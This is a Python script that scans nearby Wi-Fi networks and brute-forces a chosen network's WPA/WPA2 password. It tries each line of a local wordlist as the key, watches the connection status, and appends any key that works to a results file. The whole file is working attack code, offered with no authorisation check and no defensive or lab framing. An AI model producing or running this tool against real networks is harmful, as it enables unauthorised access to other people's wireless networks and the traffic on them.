#!/usr/bin/python3
import os
import sys
import time
from pywifi import const, PyWiFi

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

status_code = {0: 'DISCONNETED', 1: 'SCANNING',
               2: 'INACTIVE', 3: 'CONNECTING', 4: 'CONNECTED'}
akm_name_value = {0: 'NONE', 1: 'WPA', 2: 'WPAPSK',
                  3: 'WPA2', 4: 'WPA2PSK', 5: 'UNKNOWN'}

ap_cipher = False
if sys.platform == 'win32':
    os.system('cls')
    ap_cipher = True


def get_wifi_interface():
    wifi = PyWiFi()
    try:
        if len(wifi.interfaces()) <= 0:
            print('No wifi inteface found!')
            exit()
        print("=" * 73)
        if len(wifi.interfaces()) == 1:
            print(O + 'Wifi interface found:' + C +
                  wifi.interfaces()[0].name() + W)
            return wifi.interfaces()[0]
        else:
            print('%-4s   %s' % ('No', 'interface name'))
            for i, w in enumerate(wifi.interfaces()):
                print('%-4s   %s' % (i, w.name()))
            while True:
                iface_no = input('Please choose interface No:')
                no = int(iface_no)
                if no >= 0 and no < len(wifi.interfaces()):
                    return wifi.interfaces()[no]
    except FileNotFoundError as e:
        print(e.strerror + ":Please ensure you have a wireless lan")
        exit(e.errno)
    except PermissionError as e:
        print(e.strerror + ":Please run this script as root")
        exit(e.errno)


def get_akm_name(akm_value):
    akm_names = []
    for a in akm_value:
        if a in akm_name_value.keys():
            akm_names.append(akm_name_value[a])
    if len(akm_names) == 0:
        akm_names.append("OPEN")

    return '/'.join(akm_names)


def wifi_scan(iface):
    print("-" * 73)
    print("%-2s   %-20s  %-20s   %-6s   %s" %
          ('No', 'SSID', 'BSSID', 'SIGNAL', 'ENC/AUTH'))
    iface.scan()
    time.sleep(5)
    for i, ap in enumerate(iface.scan_results()):
        ssid = ap.ssid
        if len(ssid) == 0:
            ssid = '<length: 0>'
        elif ssid == '\\x00':
            ssid = '<length: 1>'
        if int(ap.signal) >= -60:
            power = G + "%-6s" % (ap.signal) + GR
        elif int(ap.signal) < -60 and int(ap.signal) >= -70:
            power = O + "%-6s" % (ap.signal) + GR
        else:
            power = R + "%-6s" % (ap.signal) + GR
        sys.stdout.write(G + "%-2s" % (i + 1) + GR + " | " + B + "%-19s" % (ssid) +
                         GR + " | " + P + "%-20s" % (ap.bssid.rstrip(':')) + GR + " | " +
                         power + " | " + C + "%s\n" % (get_akm_name(ap.akm)) + W)
    sys.stdout.flush()
    return iface.scan_results()


class Wifi_Test():

    def __init__(self, iface, ap):
        self.iface = iface
        self.ap = ap
        self.timeout = 30
        self.ap_id = ap.bssid.rstrip(':') if len(ap.ssid) == 0 \
            or ap.ssid == '\\x00' or len(ap.ssid) > len(ap.bssid) else ap.ssid
        if ap_cipher:
            self.ap.cipher = const.CIPHER_TYPE_CCMP

    def test(self, key):
        self.ap.key = key.strip('\r\n')
        self.iface.remove_all_network_profiles()
        self.iface.connect(self.iface.add_network_profile(self.ap))
        start_time = time.time()
        while True:
            time.sleep(0.1)
            self.code = self.iface.status()
            now_time = time.time() - start_time
            if now_time <= 5:
                now = G + "%5.2fs" % (now_time)
            elif now_time > 5 and now_time <= 10:
                now = O + "%5.2fs" % (now_time)
            elif now_time > 10 and now_time <= self.timeout:
                now = R + "%5.2fs" % (now_time)
            else:
                break
            sys.stdout.write(B + "\r%-17s" % (self.ap_id) + GR + " | " + now + GR +
                             " | " + C + "%-20s" % (self.ap.key) + GR +
                             " | " + P + "%-12s" % (status_code[self.code]) + W)
            sys.stdout.flush()
            if self.code == const.IFACE_DISCONNECTED:
                break
            if self.code == const.IFACE_CONNECTED:
                self.iface.disconnect()
                sys.stdout.write(B + "\r%-17s" % (self.ap_id) + GR + " | " + now +
                                 GR + " | " + C + "%-20s" % (self.ap.key) +
                                 GR + " | " + B + "%-12s" % ("FOUND!") + W)
                sys.stdout.flush()
                return self.ap.key
        if self.code == const.IFACE_DISCONNECTED and now_time < 1:
            sys.stdout.write(B + "\r%-17s" % (self.ap_id) + GR + " | " + now +
                             GR + " | " + C + "%-20s" % (self.ap.key) + GR + " | " +
                             O + "%-12s" % ("BUSY!") + W)
            sys.stdout.flush()
            time.sleep(10)
            self.test(key)
        return False


def main():
    iface = get_wifi_interface()
    while True:
        scanres = wifi_scan(iface)
        ap_num = int(input(O + '\nPlease choose test No:' + W))
        if ap_num >= 1 and ap_num <= len(scanres) + 1:
            ap = scanres[ap_num - 1]
            break
        else:
            continue
    print("%s\n%-18s| %6s | %-20s | %-12s" %
          ("=" * 73, "SSID OR BSSID", "TIME ", "KEY", "STATUS"))
    wifi_test = Wifi_Test(iface, ap)
    with open('wordlist.txt') as keys:
        for key in keys:
            result = wifi_test.test(key)
            if result:
                break
    print("\n" + "-" * 73)
    if result:
        with open('result.txt', "a") as f:
            f.write("%-18s | %s | %s\n" %
                    (ap.ssid, ap.bssid.rstrip(':'), result))
        print(G + 'Done...' + W)
    else:
        print(R + 'Fail...' + W)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
